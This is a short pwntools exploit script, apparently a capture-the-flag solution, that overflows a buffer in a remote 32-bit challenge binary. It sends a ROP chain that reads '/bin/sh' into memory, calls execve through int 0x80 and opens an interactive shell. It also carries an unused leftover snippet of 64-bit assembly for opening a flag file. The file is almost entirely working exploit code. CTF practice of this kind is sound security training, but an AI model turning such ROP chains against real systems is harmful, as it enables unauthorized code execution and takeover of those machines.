from pwn import *

context.log_level="debug"

r=remote("pwn.sixstars.team",23610)
#r=process("./rop32")

sh = """
    call here
    .ascii "./flag"
    .byte 0
here:
    pop rdi
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x02
    syscall
"""
x1=p32(0x080481c9)  #pop ebx
x2=p32(0x080df231)  #pop ecx
x3=p32(0x0806f10b)  #pop edx
x4=p32(0x080b8a16)  #pop eax
x5=p32(0x0806f710)  #int 0x80

q="2f62696e2f736800"


sh='a'*0x18+'a'*4+x1+p32(0)+x2+p32(0x80ea100)+x3+p32(8)+x4+p32(0x03)+x5

q=p32(0x6e69622f)+p32(0x0068732f)

sh2=x1+p32(0x80ea100)+x2+p32(0)+x3+p32(0)+x4+p32(0x0b)+x5

r.recvuntil(":")

#print r.pid
#pause()

r.sendline(sh+sh2)

print q
r.sendafter("!",q)
r.interactive()
